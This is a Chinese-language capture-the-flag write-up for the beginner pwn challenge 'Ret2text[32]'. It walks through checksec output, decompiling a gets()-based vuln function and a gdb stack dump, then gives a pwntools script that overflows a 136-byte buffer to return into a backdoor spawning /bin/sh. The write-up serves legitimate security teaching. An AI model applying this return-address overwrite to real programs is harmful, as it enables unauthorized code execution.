---
title: Ret2text[32]
author: 13m0n4de
difficulty: Normal
category: Pwn
image: ghcr.io/svuctf/svuctf-helloworld-2024/ret2text32:latest
port: 70
writeup_author: pn1fg
tags:
  - ret2text
reference:
---

# Ret2text\[32\]

## 题目描述

## 题目解析

`ret2text` 即 *Return to .text*，控制程序**返回**到程序 `.text` 段执行**已有的代码**。

其实不止可以控制程序执行已有的相邻的代码，还可以控制程序执行好几段**不相邻**的代码 (Gadgets)。

---

现在来到了“真正意义”上的 Pwn 题，我们需要输入特定的数据，破坏程序的执行流程，执行我们想要的代码，当然程序也可能会开启某些保护，我们需要想办法去绕过它们，不过这里暂时还没有。

不同于前几题，从这题开始要求有基本的反编译、调试程序能力，了解文件基本结构、程序的加载和执行流程。

### 查看文件信息

查看文件类型：

```
$ file ret2text32
ret2text32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0aa9c1e91756adee072cb3c1f93c68aa13ec64d9, not stripped
```

32位 ELF 文件，动态链接，没有去除符号。

查看保护机制：

```
$ checksec --file=ret2text32
RELRO           Partial RELRO
STACK CANARY    No canary found
NX              NX enabled
PIE             No PIE
RPATH           No RPATH
RUNPATH	        No RUNPATH
Symbols		    79 Symbols
FORTIFY	        No
Fortified	    0
Fortifiable	    2
FILE            ret2text32
```

NX 保护。

### 分析漏洞成因

反编译 `vuln` 函数：

```c
[0x08048480]> s sym.vuln
[0x08048684]> pdg

int vuln()
{
  char v1[136]; // [esp+10h] [ebp-88h] BYREF

  puts("Program: Hey there! Think you can hack me?");
  printf("You: ");
  gets(v1);
  return puts("Program: Hmm, I feel a bit strange...");
}
```

`gets` 函数可以读入无限制长度的字符（直到换行 `\n`），导致超出 `v1` 的长度，覆盖 `ebp` 的值，并继续覆盖函数的返回地址。

使用 [gdb](https://sourceware.org/gdb/) + [pwndbg](https://github.com/pwndbg/pwndbg) 调试，在 `0x080486ae` 处打断点，输入一串字符串，下面是栈的情况

```asm
pwndbg> stack 50
00:0000│ esp 0xffffcff0 —▸ 0xffffd000 ◂— 'dddd'
01:0004│     0xffffcff4 —▸ 0xf7f8ed87 (_IO_2_1_stdout_+71) ◂— 0xf8f8a00a
02:0008│     0xffffcff8 ◂— 1
03:000c│     0xffffcffc —▸ 0xf7de77bf (_IO_file_xsputn+399) ◂— cmp eax, edi
04:0010│ eax 0xffffd000 ◂— 'dddd'
05:0014│     0xffffd004 ◂— 0
06:0018│     0xffffd008 —▸ 0xffffd030 —▸ 0xf7f8ed40 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:001c│     0xffffd00c ◂— 0xa /* '\n' */
08:0020│     0xffffd010 —▸ 0xf7f8ed40 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│     0xffffd014 —▸ 0xf7f8de2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x22ed4c
0a:0028│     0xffffd018 —▸ 0xffffd068 —▸ 0xffffd088 —▸ 0xffffd098 ◂— 0
0b:002c│     0xffffd01c —▸ 0xf7ddd4c9 (putchar+217) ◂— mov ebx, eax
0c:0030│     0xffffd020 —▸ 0xf7f8ed40 (_IO_2_1_stdout_) ◂— 0xfbad2887
0d:0034│     0xffffd024 —▸ 0xf7f8de2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x22ed4c
0e:0038│     0xffffd028 —▸ 0xf7de66d9 (_IO_file_overflow+9) ◂— add eax, 0x1a7753
0f:003c│     0xffffd02c —▸ 0xf7ddd4c9 (putchar+217) ◂— mov ebx, eax
10:0040│     0xffffd030 —▸ 0xf7f8ed40 (_IO_2_1_stdout_) ◂— 0xfbad2887
11:0044│     0xffffd034 ◂— 0xa /* '\n' */
12:0048│     0xffffd038 ◂— 0x26 /* '&' */
13:004c│     0xffffd03c —▸ 0xffffd068 —▸ 0xffffd088 —▸ 0xffffd098 ◂— 0
14:0050│     0xffffd040 —▸ 0xf7ffcfe4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x34f2c
15:0054│     0xffffd044 —▸ 0xf7f8de2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x22ed4c
16:0058│     0xffffd048 —▸ 0xf7f8d7a8 (_IO_file_jumps) ◂— 0
17:005c│     0xffffd04c —▸ 0xf7fc1440 ◂— 0xf7fc1440
18:0060│     0xffffd050 —▸ 0xffffd088 —▸ 0xffffd098 ◂— 0
19:0064│     0xffffd054 —▸ 0xf7fd8f20 (_dl_runtime_resolve+16) ◂— pop edx
1a:0068│     0xffffd058 ◂— 0
1b:006c│     0xffffd05c —▸ 0xf7f8de2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x22ed4c
1c:0070│     0xffffd060 —▸ 0x80486e0 (__libc_csu_init) ◂— push ebp
1d:0074│     0xffffd064 —▸ 0xf7ffcb60 (_rtld_global_ro) ◂— 0
1e:0078│     0xffffd068 —▸ 0xffffd088 —▸ 0xffffd098 ◂— 0
1f:007c│     0xffffd06c —▸ 0x804866e (banner+90) ◂— leave
20:0080│     0xffffd070 ◂— 0xa /* '\n' */
21:0084│     0xffffd074 ◂— 0
22:0088│     0xffffd078 ◂— 2
23:008c│     0xffffd07c ◂— 0
... ↓        2 skipped
26:0098│ ebp 0xffffd088 —▸ 0xffffd098 ◂— 0
```

我们的输入点 `v1` 距离 `ebp` 寄存器 `0xffffd088 - 0xffffd000 = 0x88`，也就是 136，与反编译得到的结果一致。

当我们输入 136 个字符以后，再输入 4 个字符，就可以完全覆盖 `ebp`，继续输入 4 个字符，即可**覆盖返回地址**。

### 构造利用载荷

新的问题，覆盖返回地址，返回到哪呢？

列出程序所有函数：

```
[0x08048670]> afl
0x08048400    1      6 sym.imp.printf
0x08048410    1      6 sym.imp.gets
0x08048420    1      6 sym.imp.puts
0x08048430    1      6 sym.imp.system
0x08048440    1      6 sym.imp.__libc_start_main
0x08048450    1      6 sym.imp.setvbuf
0x08048460    1      6 sym.imp.putchar
0x08048480    1     50 entry0
0x080484b3    1      4 fcn.080484b3
0x080484e0    4     42 sym.deregister_tm_clones
0x08048510    4     55 sym.register_tm_clones
0x08048550    3     30 sym.__do_global_dtors_aux
0x08048570    4     44 sym.frame_dummy
0x08048740    1      2 sym.__libc_csu_fini
0x080484d0    1      4 sym.__x86.get_pc_thunk.bx
0x08048684    1     61 sym.vuln
0x08048744    1     20 sym._fini
0x08048614    1     92 sym.banner
0x0804859d    1    119 sym.init
0x080486e0    4     93 sym.__libc_csu_init
0x08048670    1     20 sym.backdoor
0x080484c0    1      2 sym._dl_relocate_static_pie
0x080486c1    1     28 main
0x080483c0    3     35 sym._init
0x08048470    1      6 fcn.08048470
```

很显眼的后门函数`backdoor`，反编译如下：

```c
[0x08048684]> s sym.backdoor
[0x08048670]> pdg

int backdoor()
{
  return system("/bin/sh");
}
```

程序调用 `system` 执行 `/bin/sh`，从而获取 shell，我们可以覆盖返回地址为 `backdoor` 函数的地址

所以我们可以构造一个 payload（攻击载荷）：

```
|<--      padding       ->| + |<- fake ebp ->| + |<- return address ->| + |<- newline -->|
aaaabaaacaaa...yaaazaaabaab +       caab       +    \x70\x86\x04\x08    +      \x0a       
|          0x88           |   |     0x4      |   |        0x4         |   |     0x1      |
```

### 编写利用程序

```python
from pwn import *

context.arch = "i386"
context.log_level = "debug"

io = process("../attachments/ret2text32")
elf = ELF("../attachments/ret2text32")

payload = flat([cyclic(136), b"A" * 4, elf.sym["backdoor"]])
io.sendlineafter(b"You: ", payload)

io.interactive()
```
